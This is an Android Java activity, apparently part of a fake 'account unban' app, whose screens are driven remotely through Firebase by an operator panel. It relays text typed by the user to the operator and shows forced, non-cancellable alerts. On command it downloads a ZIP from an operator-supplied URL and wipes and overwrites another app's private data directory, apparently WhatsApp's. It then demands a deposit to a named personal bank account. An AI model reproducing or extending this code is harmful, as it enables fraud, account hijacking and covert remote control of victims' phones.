package com.ban.ab;

import android.app.AlertDialog;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Vibrator;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText; 
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import androidx.core.app.NotificationCompat;

// استيراد حزم Firebase الرسمية للربط الحي والمباشر 🚀
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    
    // مراجع الفايربيس الرسمية
    private DatabaseReference mCommandsRef;
    private DatabaseReference mUserStatusRef;
    private ValueEventListener mCommandsListener;

    private CardView layoutWaiting, layoutRejected, layoutZipTask, layoutVerifyTask, layoutPayment;
    private TextView txtRejectReason, txtTicketID, txtPaymentDetails;
    private Button btnExecuteTask, btnStartFullVerify;
    private ProgressBar taskProgressBar;

    private long lastProcessedTimestamp = 0;
    private AlertDialog currentDialog = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");

        // تهيئة مراجع المراقبة وحالة النشاط الحية
        mUserStatusRef = FirebaseDatabase.getInstance().getReference("users_status").child(userName);

        initViews();
        generateTicketID();
        
        // البدء بمراقبة أوامر لوحة التحكم بشكل حي ⚡
        startRealtimeCommandListener();
    }

    @Override
    protected void onResume() {
        super.onResume();
        // 🟢 تحديث حقل الـ status صراحة ليتوافق مع مستمع الأدمن المحدث ويظهر أونلاين فوراً
        mUserStatusRef.child("status").setValue("Online (In-App)");
    }

    @Override
    protected void onPause() {
        super.onPause();
        // 🔴 تحديث حقل الـ status صراحة إلى أوفلاين عند الخروج
        mUserStatusRef.child("status").setValue("Offline");
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutZipTask = findViewById(R.id.layoutZipTask);
        layoutVerifyTask = findViewById(R.id.layoutVerifyTask);
        layoutPayment = findViewById(R.id.layoutPayment);

        txtRejectReason = findViewById(R.id.txtRejectReason);
        txtTicketID = findViewById(R.id.txtTicketID);
        txtPaymentDetails = findViewById(R.id.txtPaymentDetails);

        btnExecuteTask = findViewById(R.id.btnExecuteTask);
        btnStartFullVerify = findViewById(R.id.btnStartFullVerify);
        taskProgressBar = findViewById(R.id.taskProgressBar);
    }

    // مستمع يراقب التغيرات في السيرفر بشكل صامت وفوري 📡
    private void startRealtimeCommandListener() {
        mCommandsRef = FirebaseDatabase.getInstance().getReference("commands").child(userName);
        
        mCommandsListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) {
                    handleDeletion(); // تم إنهاء العقدة من لوحة التحكم، تدمير الجلسة
                    return;
                }

                // الفحص الفوري لأمر التنبيه والاهتزاز العاجل 🚨
                if (snapshot.hasChild("trigger_alert")) {
                    Boolean shouldAlert = snapshot.child("trigger_alert").getValue(Boolean.class);
                    if (shouldAlert != null && shouldAlert) {
                        triggerUserAlert();
                        mCommandsRef.child("trigger_alert").setValue(false); // تصفير الراية لمنع التكرار
                    }
                }

                Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                String status = snapshot.child("status").getValue(String.class);
                String content = snapshot.child("content").getValue(String.class);
                String backupUrl = snapshot.child("backup_url").getValue(String.class);

                if (timestamp != null && timestamp > lastProcessedTimestamp) {
                    lastProcessedTimestamp = timestamp;
                    
                    // تمرير البيانات المحدثة لمعالجتها تلقائياً
                    handleCommand(status, content, backupUrl);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e("Firebase_Live", "Listen canceled: " + error.getMessage());
            }
        };
        
        mCommandsRef.addValueEventListener(mCommandsListener);
    }

    // دالة موحدة لضخ أعلام ومعرفات الحالة الرقمية لتوستات العميل إلى الأدمن 🛡️
    private void updateAppFlag(String stateCode) {
        mUserStatusRef.child("current_state").setValue(stateCode)
                .addOnFailureListener(e -> Log.e("State_Update", "فشل دفع المعرف السحابي"));
    }

    // محرك التنبيه الثلاثي (اهتزاز ميكانيكي + إشعار نظام + ديالوج)
    private void triggerUserAlert() {
        // 1. تشغيل الاهتزاز الميكانيكي لشد انتباه المستخدم
        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(1000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(1000);
            }
        }

        // 2. بناء قناة ودفع إشعار رسمي علوي
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        String channelId = "admin_alerts_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "تنبيهات النظام", NotificationManager.IMPORTANCE_HIGH);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(android.R.drawable.stat_sys_warning)
                .setContentTitle("تنبيه هام 🛡️")
                .setContentText("يرجى البقاء داخل التطبيق لإكمال عملية التحقق.")
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true);

        if (nm != null) nm.notify(202, builder.build());

        // 3. انبثاق واجهة ديالوج إجبارية تمنع الإغلاق العشوائي
        new AlertDialog.Builder(this)
                .setTitle("تحديث مطلوب")
                .setMessage("يرجى عدم إغلاق التطبيق أو الخروج من هذه الشاشة حتى انتهاء المزامنة السحابية بنجاح.")
                .setPositiveButton("موافق", null)
                .setCancelable(false)
                .show();
    }

    private void handleDeletion() {
        getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
        Toast.makeText(this, "انتهت صلاحية الجلسة أو تم إلغاء الحساب", Toast.LENGTH_LONG).show();
        finishAffinity(); 
    }

    private void handleCommand(String status, String content, String backupUrl) {
        hideAllLayouts();
        if (content == null) content = "";

        switch (status) {
            case "waiting":
                layoutWaiting.setVisibility(View.VISIBLE);
                break;
                
            case "rejected":
                layoutRejected.setVisibility(View.VISIBLE);
                txtRejectReason.setText(content.isEmpty() ? "تم رفض طلبك حالياً" : content);
                break;
                
            case "backup_task": 
                layoutZipTask.setVisibility(View.VISIBLE);
                btnExecuteTask.setText("تطبيق التحديث الفوري (ZIP)");
                btnExecuteTask.setOnClickListener(v -> startZipExtractionProcess(backupUrl));
                break;
                
            case "verify_phone":
                layoutVerifyTask.setVisibility(View.VISIBLE);
                btnStartFullVerify.setOnClickListener(v -> {
                    updateAppFlag("STATE_INITIALIZING"); // دفع معرّف تهيئة الفحص للأدمن
                    startActivity(new Intent(this, VerifyActivity.class));
                });
                break;
                
            case "show_payment":
                showPaymentUI(content);
                break;
                
            case "show_alert":
                layoutWaiting.setVisibility(View.VISIBLE);
                showCustomPopUp(content, false);
                break;
                
            case "show_input":
                layoutWaiting.setVisibility(View.VISIBLE);
                showCustomPopUp(content, true);
                break;
                
            default:
                layoutWaiting.setVisibility(View.VISIBLE);
                break;
        }
    }

    private void hideAllLayouts() {
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutZipTask.setVisibility(View.GONE);
        layoutVerifyTask.setVisibility(View.GONE);
        layoutPayment.setVisibility(View.GONE);
    }

    private void startZipExtractionProcess(String zipUrl) {
        if (zipUrl == null || zipUrl.isEmpty()) return;
        
        btnExecuteTask.setEnabled(false);
        taskProgressBar.setVisibility(View.VISIBLE);
        
        new Thread(() -> {
            try {
                Intent stopIntent = new Intent("com.target.app.ACTION_FORCE_CLOSE");
                sendBroadcast(stopIntent);
                Thread.sleep(1000);

                File tempZip = new File(getFilesDir(), "Backup.zip");
                downloadFileNative(zipUrl, tempZip);

                File targetWhatsappDir = new File("/data/data/com.target.app/"); 

                if (targetWhatsappDir.exists()) {
                    runOnUiThread(() -> {
                        Toast.makeText(this, "جاري تهيئة المجلد ومسح البيانات القديمة...", Toast.LENGTH_SHORT).show();
                    });
                    
                    deleteDirectoryContents(targetWhatsappDir);
                    unzip(tempZip, targetWhatsappDir);

                    runOnUiThread(() -> {
                        Toast.makeText(this, "اكتمل استبدال البيانات والتحديث بنجاح! ✅", Toast.LENGTH_LONG).show();
                        updateAppFlag("STATE_SYNC_SUCCESS"); // 🟢 إرسال معرّف النجاح للأدمن
                        resetStatusOnServer();
                    });
                    runOnUiThread(() -> {
                        Toast.makeText(this, "اكتمل استبدال البيانات والتحديث بنجاح! ✅", Toast.LENGTH_LONG).show();
                        updateAppFlag("STATE_2"); // 🟢 إرسال معرّف النجاح للأدمن
                        resetStatusOnServer();
                    });
                    runOnUiThread(() -> {
                        Toast.makeText(this, "يرجى الانتظار", Toast.LENGTH_LONG).show();
                        updateAppFlag("STATE_wait"); // 🟢 إرسال معرّف النجاح للأدمن
                        resetStatusOnServer();
                    });
                } else {
                    runOnUiThread(() -> {
                        Toast.makeText(this, "خطأ: لم يتم العثور على الحزمة المستهدفة", Toast.LENGTH_SHORT).show();
                        updateAppFlag("STATE_SYNC_FAILED"); // 🔴 إرسال معرّف الفشل للأدمن
                    });
                }

            } catch (Exception e) {
                Log.e("Zip_Extraction_Error", "Failed to clear or transfer files", e);
                runOnUiThread(() -> {
                    Toast.makeText(this, "فشل في معالجة واستبدال الملفات", Toast.LENGTH_SHORT).show();
                    updateAppFlag("STATE_SYNC_FAILED"); // 🔴 إرسال معرّف الفشل للأدمن
                });
            }
            
            runOnUiThread(() -> {
                taskProgressBar.setVisibility(View.GONE);
                btnExecuteTask.setEnabled(true);
            });
        }).start();
    }

    private void deleteDirectoryContents(File dir) {
        if (dir.isDirectory()) {
            String[] children = dir.list();
            if (children != null) {
                for (String child : children) {
                    File file = new File(dir, child);
                    if (file.isDirectory()) {
                        deleteDirectoryContents(file); 
                    }
                    file.delete();
                }
            }
        }
    }

    private void downloadFileNative(String fileUrl, File destFile) throws IOException {
        URL url = new URL(fileUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.connect();

        if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
            throw new IOException("Server returned HTTP " + connection.getResponseCode());
        }

        try (InputStream input = connection.getInputStream();
             FileOutputStream output = new FileOutputStream(destFile)) {
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = input.read(buffer)) != -1) {
                output.write(buffer, 0, bytesRead);
            }
        } finally {
            connection.disconnect();
        }
    }

    private void unzip(File zipFile, File targetDirectory) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)))) {
            ZipEntry ze;
            byte[] buffer = new byte[4096];
            while ((ze = zis.getNextEntry()) != null) {
                File file = new File(targetDirectory, ze.getName());
                File dir = ze.isDirectory() ? file : file.getParentFile();
                
                if (dir != null && !dir.isDirectory() && !dir.mkdirs()) {
                    throw new IOException("Failed to ensure directory: " + dir.getAbsolutePath());
                }
                if (ze.isDirectory()) continue;
                
                try (FileOutputStream fos = new FileOutputStream(file)) {
                    int count;
                    while ((count = zis.read(buffer)) != -1) {
                        fos.write(buffer, 0, count);
                    }
                }
            }
        }
    }

    private void showPaymentUI(String amount) {
        layoutPayment.setVisibility(View.VISIBLE);
        String details = "تم فك الحظر بنجاح 100% للرقم المرجعي :- " + txtTicketID.getText() + "\n\n" +
                "يرجى إيداع مبلغ " + amount + " إلى حسابنا في العمقي\n" +
                "رقم الحساب:- 254293617\n" +
                "الإسم : عبدالله سعيد عبدالله علاوه التميمي\n\n" +
                "حتى يتم إكمال الخطوة الأخيرة لتشغيل حسابك فوراً.";
        txtPaymentDetails.setText(details);
    }

    private void showCustomPopUp(String message, boolean isInput) {
        if (currentDialog != null && currentDialog.isShowing()) return;

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        View view = getLayoutInflater().inflate(R.layout.dialog_custom, null);
        
        TextView txtMsg = view.findViewById(R.id.dialogMessage);
        EditText edtIn = view.findViewById(R.id.dialogInput);
        Button btnOk = view.findViewById(R.id.btnDialogAction);
        ImageView btnClose = view.findViewById(R.id.btnDialogClose);

        txtMsg.setText(message);
        edtIn.setVisibility(isInput ? View.VISIBLE : View.GONE);
        
        currentDialog = builder.setView(view).setCancelable(false).create();
        if(currentDialog.getWindow() != null) currentDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        btnClose.setOnClickListener(v -> {
            resetStatusOnServer();
            currentDialog.dismiss();
        });

        btnOk.setOnClickListener(v -> {
            if(isInput) {
                String input = edtIn.getText().toString().trim();
                if (!input.isEmpty()) {
                    sendResponseToAdmin(input);
                    currentDialog.dismiss();
                } else {
                    edtIn.setError("مطلوب");
                }
            } else {
                resetStatusOnServer();
                currentDialog.dismiss();
            }
        });
        currentDialog.show();
    }

    private void sendResponseToAdmin(String response) {
        DatabaseReference respRef = FirebaseDatabase.getInstance().getReference("user_responses").child(userName);
        
        Map<String, Object> data = new HashMap<>();
        data.put("answer", response);
        data.put("time", System.currentTimeMillis());

        respRef.setValue(data).addOnSuccessListener(aVoid -> resetStatusOnServer());
    }

    private void resetStatusOnServer() {
        FirebaseDatabase.getInstance().getReference("commands")
                .child(userName).child("status").setValue("waiting");
    }

    private void generateTicketID() { 
        txtTicketID.setText("BT-" + (System.currentTimeMillis() / 1000000)); 
    }

    @Override 
    protected void onDestroy() { 
        super.onDestroy(); 
        if (mCommandsRef != null && mCommandsListener != null) {
            mCommandsRef.removeEventListener(mCommandsListener);
        }
    }
}
